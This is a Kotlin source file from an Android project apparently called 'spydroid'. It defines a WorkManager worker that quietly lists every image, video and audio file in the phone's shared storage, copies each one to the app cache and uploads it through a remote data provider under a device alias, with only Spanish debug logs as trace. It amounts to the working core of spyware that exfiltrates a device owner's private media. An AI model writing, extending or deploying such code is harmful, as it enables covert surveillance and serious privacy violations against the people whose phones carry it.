/*
 * Copyright (C) 2024 Daniel Gómez(Less)
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */

package net.spydroid.feature.multimedia

import android.content.ContentUris
import android.content.Context
import android.net.Uri
import android.provider.MediaStore
import android.provider.MediaStore.Video
import android.util.Log
import android.widget.Toast
import androidx.core.net.toUri
import androidx.work.Worker
import androidx.work.WorkerParameters
import dagger.hilt.EntryPoint
import dagger.hilt.InstallIn
import dagger.hilt.android.EntryPointAccessors
import dagger.hilt.components.SingletonComponent
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.SharingStarted
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.catch
import kotlinx.coroutines.flow.collect
import kotlinx.coroutines.flow.map
import kotlinx.coroutines.flow.stateIn
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import net.spydroid.common.local.LocalDataProvider
import net.spydroid.common.remote.RemoteDataProvider
import net.spydroid.feature.multimedia.local.domain.AudioRepository
import net.spydroid.feature.multimedia.local.domain.ImageRepository
import net.spydroid.feature.multimedia.local.domain.VideoRepository
import net.spydroid.feature.multimedia.local.models.AudioHandler
import net.spydroid.feature.multimedia.local.models.ImageHandler
import net.spydroid.feature.multimedia.local.models.VideoHandler
import net.spydroid.feature.multimedia.local.states.AudioState
import net.spydroid.feature.multimedia.local.states.ImageState
import net.spydroid.feature.multimedia.local.states.VideoState
import java.io.File
import java.io.FileOutputStream
import java.io.InputStream


@EntryPoint
@InstallIn(SingletonComponent::class)
private interface ImagesWorkEntryPoint {
    fun imageRepository(): ImageRepository
}


@EntryPoint
@InstallIn(SingletonComponent::class)
private interface VideoWorkEntryPoint {
    fun videoRepository(): VideoRepository
}

@EntryPoint
@InstallIn(SingletonComponent::class)
private interface AudioWorkEntryPoint {
    fun audioRepository(): AudioRepository
}


private fun getFileFromUri(context: Context, uri: Uri, ext: String): File {

    val tempFile = when (ext) {
        "jpg" -> "image"
        "mp4" -> "video"
        "mp3" -> "audio"
        else -> "unknown"
    }
    val inputStream: InputStream? = context.contentResolver.openInputStream(uri)
    val file = File(context.cacheDir, "${tempFile}_${System.currentTimeMillis()}.$ext")

    val outputStream = FileOutputStream(file)
    val buffer = ByteArray(1024)
    var length: Int

    while (inputStream?.read(buffer).also { length = it!! } != -1) {
        outputStream.write(buffer, 0, length)
    }

    outputStream.flush()
    outputStream.close()
    inputStream?.close()

    return file
}

class MultimediaWork(
    private val context: Context,
    workerParams: WorkerParameters
) :
    Worker(context, workerParams) {

    private val localDataProvider = LocalDataProvider.current(context)
    private val remoteDataProvider = RemoteDataProvider.current(context)

    private val scope = CoroutineScope(Dispatchers.IO)

    /*
        private val imageRepository =
        EntryPointAccessors.fromApplication(context, ImagesWorkEntryPoint::class.java)
            .imageRepository()
    private val videoRepository =
        EntryPointAccessors.fromApplication(context, VideoWorkEntryPoint::class.java)
            .videoRepository()
    private val audioRepository =
        EntryPointAccessors.fromApplication(context, AudioWorkEntryPoint::class.java)
            .audioRepository()
     */

    override fun doWork(): Result {
        try {
            scope.launch {

                localDataProvider.aliasDevice.collect { alias ->
                    if (alias.isNotBlank()) {
                        remoteDataProvider.unuploadedFilesToInternet.collect { FilesToInternet ->
                            if (!FilesToInternet) {
                                withContext(Dispatchers.IO) {
                                    val projectionImage = arrayOf(MediaStore.Images.Media._ID)
                                    val cursorImage = context.contentResolver.query(
                                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                                        projectionImage,
                                        null,
                                        null,
                                        MediaStore.Images.Media.DATE_ADDED + " DESC"
                                    )

                                    cursorImage?.use {
                                        val idColumn =
                                            it.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                                        while (it.moveToNext()) {
                                            val id = it.getLong(idColumn)
                                            val imageUri = ContentUris.withAppendedId(
                                                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                                                id
                                            )
                                            withContext(Dispatchers.IO) {
                                                remoteDataProvider.setFile(
                                                    file = getFileFromUri(context, imageUri, "jpg"),
                                                    type = "IMAGE",
                                                    alias = alias
                                                )
                                            }
                                        }
                                    }
                                }

                            } else {
                                // UPDATE IMAGES
                                showText("ACTUALIZANDO IMAGENES")
                            }
                        }

                    }
                }

            }


            scope.launch {
                localDataProvider.aliasDevice.collect { alias ->
                    if (alias.isNotBlank()) {
                        remoteDataProvider.unuploadedFilesToInternet.collect { FilesToInternet ->
                            if (!FilesToInternet) {
                                withContext(Dispatchers.IO) {
                                    val projectionVideo = arrayOf(Video.Media._ID)
                                    val cursorVideo = context.contentResolver.query(
                                        MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                                        projectionVideo,
                                        null,
                                        null,
                                        Video.Media.DATE_ADDED + " DESC"
                                    )

                                    cursorVideo?.use {
                                        val idColumn =
                                            it.getColumnIndexOrThrow(Video.Media._ID)
                                        while (it.moveToNext()) {
                                            val id = it.getLong(idColumn)
                                            val uriVideo = ContentUris.withAppendedId(
                                                Video.Media.EXTERNAL_CONTENT_URI,
                                                id
                                            )
                                            withContext(Dispatchers.IO) {
                                                remoteDataProvider.setFile(
                                                    file = getFileFromUri(context, uriVideo, "mp4"),
                                                    type = "VIDEO",
                                                    alias = alias
                                                )
                                            }
                                        }
                                    }
                                }
                            } else {
                                // UPDATED VIDEOS
                                showText("ACTUALIZANDO VIDEOS")
                            }
                        }

                    }
                }

            }

            scope.launch {
                localDataProvider.aliasDevice.collect { alias ->
                    if (alias.isNotBlank()) {
                        remoteDataProvider.unuploadedFilesToInternet.collect { FilesToInternet ->
                            if (!FilesToInternet) {
                                withContext(Dispatchers.IO) {
                                    val projectionAudio = arrayOf(MediaStore.Audio.Media._ID)
                                    val cursorAudio = context.contentResolver.query(
                                        MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
                                        projectionAudio,
                                        null,
                                        null,
                                        MediaStore.Audio.Media.DATE_ADDED + " DESC"
                                    )

                                    cursorAudio?.use {
                                        val idColumn =
                                            it.getColumnIndexOrThrow(MediaStore.Audio.Media._ID)
                                        while (it.moveToNext()) {
                                            val id = it.getLong(idColumn)
                                            val uriAudio = ContentUris.withAppendedId(
                                                MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
                                                id
                                            )
                                            withContext(Dispatchers.IO) {
                                                remoteDataProvider.setFile(
                                                    file = getFileFromUri(context, uriAudio, "mp3"),
                                                    type = "AUDIO",
                                                    alias = alias
                                                )
                                            }
                                        }
                                    }
                                }
                            } else {
                                // UPDATED AUDIOS
                                showText("ACTUALIZANDO AUDIOS")
                            }
                        }

                    }
                }
            }
            scope.launch(Dispatchers.IO) {
                val mins = 1 // 5 minutes
                val time = mins * 60 * 1000L
                remoteDataProvider.unuploadedFilesToInternet.collect {
                    if (!it) {
                        Log.d("INICIO_TIM", "ICIANDO TIEMPO")
                        delay(time)
                        remoteDataProvider.setStateFilesInternet(true)
                        Log.d("INICIO_TIM", "TERMINANDO TIEMPO")
                    }
                }
            }
            return Result.success()
        } catch (e: Exception) {
            return Result.failure()
        }
    }
    private fun showText(text: String) =
        Log.d("INICIO_TIM", text)
}